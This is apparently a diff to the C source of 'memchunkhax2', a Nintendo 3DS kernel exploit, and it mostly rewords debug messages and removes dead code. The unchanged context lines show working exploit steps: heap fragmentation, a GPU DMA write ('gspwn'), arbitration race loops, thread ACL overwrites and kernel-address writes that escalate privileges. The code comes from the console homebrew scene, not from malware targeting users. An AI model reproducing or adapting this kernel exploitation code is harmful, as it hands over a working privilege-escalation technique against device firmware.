@@ -119,7 +119,6 @@ typedef struct
 
    Handle dummy_threads_lock;
    Handle target_threads_lock;
-   Handle main_thread_lock;
    u32* thread_page_va;
    u32 thread_page_kva;
 
@@ -215,7 +214,7 @@ static void create_check_tls_threads(mch2_vars_t *mch2) {
       }
       svcCloseHandle(mch2->threads[i].handle);
    }
-   printf("create_check_tls_threads done\n");
+   printf("[x] check tls threads\n");
 }
 
 static void create_dummy_threads(mch2_vars_t *mch2) {
@@ -247,7 +246,7 @@ static void create_dummy_threads(mch2_vars_t *mch2) {
    }
 
    svcCloseHandle(mch2->dummy_threads_lock);
-   printf("create_dummy_threads done\n");
+   printf("[x] create dummy threads\n");
 }
 
 static void create_target_thread(mch2_vars_t *mch2, mch2_thread_t *thread) {
@@ -313,18 +312,8 @@ static void do_memchunkhax2(void)
    u32 fragmented_address = 0;
 
    mch2.arbiter = __sync_get_arbiter();
-   printf("arbiter: 0x%x\n", mch2.arbiter);
+   printf("- arbiter: 0x%x\n", mch2.arbiter);
 
-   /*
-   if (mch2.arbiter > 0x7c0000) {
-     printf("oops!!?\n");
-     close_not_keep_target_threads(&mch2);
-     aptOpenSession();
-     APT_SetAppCpuTimeLimit(mch2.old_cpu_time_limit);
-     aptCloseSession();
-     return;
-   }
-   */
    u32 linear_buffer;
    svcControlMemory(&linear_buffer, 0, 0, 0x1000, MEMOP_ALLOC_LINEAR, MEMPERM_READ | MEMPERM_WRITE);
 
@@ -356,7 +345,7 @@ static void do_memchunkhax2(void)
    u32 alloc_address_kaddr = osConvertVirtToPhys((void*)linear_address) + mch2.kernel_fcram_mapping_offset;
 
    mch2.thread_page_kva = get_first_free_basemem_page(mch2.isNew3DS) - 0x10000; // skip down 16 pages
-   printf("kva: 0x%x\n", mch2.thread_page_kva);
+   printf("- thread_page_kva: 0x%x\n", mch2.thread_page_kva);
    ((u32*)linear_buffer)[0] = 1;
    ((u32*)linear_buffer)[1] = mch2.thread_page_kva;
    ((u32*)linear_buffer)[2] = alloc_address_kaddr + (((mch2.alloc_size >> 12) - 3) << 13) + (skip_pages << 12);
@@ -372,30 +361,26 @@ static void do_memchunkhax2(void)
    svcCreateThread(&mch2.alloc_thread, (ThreadFunc)alloc_thread_entry, (u32)&mch2,
                    mch2.threads[MCH2_THREAD_COUNT_MAX - 1].stack_top, 0x3F, 1);
 
-   printf("mch2.alloc_address: 0x%x\n", mch2.alloc_address);
+   printf("- alloc_address: 0x%x\n", mch2.alloc_address);
    while ((u32) svcArbitrateAddress(mch2.arbiter, mch2.alloc_address, ARBITRATION_WAIT_IF_LESS_THAN_TIMEOUT, 0,
                                     0) == 0xD9001814);
 
    svcClearEvent(gspEvents[GSPGPU_EVENT_PPF]);
    GX_TextureCopy((void*)linear_buffer, 0, (void*)dst_memchunk, 0, 16, 8);
    svcWaitSynchronization(gspEvents[GSPGPU_EVENT_PPF], U64_MAX);
-   printf("call gspwn done\n");
+   printf("[x] gspwn\n");
 
    memcpy(flush_buffer, flush_buffer + 0x4000, 0x4000);
 
    svcWaitSynchronization(mch2.alloc_thread, U64_MAX);
-   printf("alloc thread wait done\n");
    svcCloseHandle(mch2.alloc_thread);
-   printf("alloc thread close done\n");
-
-   printf("alloc_thread_entry done\n");
+   printf("[x] alloc thread entry\n");
 
    u32* mapped_page = (u32*)(mch2.alloc_address + mch2.alloc_size - 0x1000);
 
    volatile u32* thread_ACL = &mapped_page[THREAD_PAGE_ACL_OFFSET >> 2];
 
-   printf("main thread event start\n");
-   //svcCreateEvent(&mch2.main_thread_lock, 0);
+   printf("[x] target thread... ");
    svcCreateEvent(&mch2.target_threads_lock, 1);
    svcClearEvent(mch2.target_threads_lock);
 
@@ -403,10 +388,6 @@ static void do_memchunkhax2(void)
    {
       if (mch2.threads[i].keep)
          continue;
-
-      //mch2.threads[i].args.started_event = mch2.main_thread_lock;
-      //mch2.threads[i].args.lock = mch2.target_threads_lock;
-      //mch2.threads[i].args.target_kaddr = 0;
 
       thread_ACL[0] = 0;
       GSPGPU_FlushDataCache((void*)thread_ACL, 16);
@@ -428,26 +409,24 @@ static void do_memchunkhax2(void)
 
    close_not_keep_target_threads(&mch2);
 
-   //svcCloseHandle(mch2.main_thread_lock);
-   printf("main thread event done\n");
+   printf("done\n");
 
+   printf("[x] get control memory 1\n");
    svcControlMemory(&tmp, mch2.alloc_address, 0, mch2.alloc_size, MEMOP_FREE, MEMPERM_DONTCARE);
    write_kaddr(alloc_address_kaddr + linear_size - 0x3000 + 0x4, alloc_address_kaddr + linear_size - 0x1000);
    svcControlMemory(&tmp, (u32)fragmented_address, 0x0, fragmented_size, MEMOP_FREE, MEMPERM_DONTCARE);
 
-   printf("control 1\n");
+   printf("[x] get control memory 2\n");
    for (i = 1 + skip_pages; i < (linear_size >> 12) ; i += 2)
       svcControlMemory(&tmp, (u32)linear_address + (i << 12), 0x0, 0x1000, MEMOP_FREE, MEMPERM_DONTCARE);
 
-   printf("control 2\n");
+   printf("[x] get control memory 3\n");
    svcControlMemory(&tmp, linear_buffer, 0, 0x1000, MEMOP_FREE, MEMPERM_DONTCARE);
 
-   printf("control 3\n");
    aptOpenSession();
    APT_SetAppCpuTimeLimit(mch2.old_cpu_time_limit);
    aptCloseSession();
-   printf("control 4\n");
-
+   printf("[x] done\n");
 }
 
 
